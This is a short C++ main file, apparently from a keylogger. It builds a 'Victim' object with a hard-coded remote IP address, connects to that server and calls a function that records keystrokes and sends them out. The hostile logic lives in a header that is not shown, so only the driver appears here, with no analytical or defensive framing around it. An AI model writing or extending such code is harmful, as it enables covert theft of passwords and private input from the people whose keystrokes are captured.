#include "Victim.h"

int main() {
	Victim* victim = new Victim("3.22.15.135");

	if (victim->connectToServer() != 0) {
		return -1;
	}
	victim->recordAndSendKeys();

	return 0;
}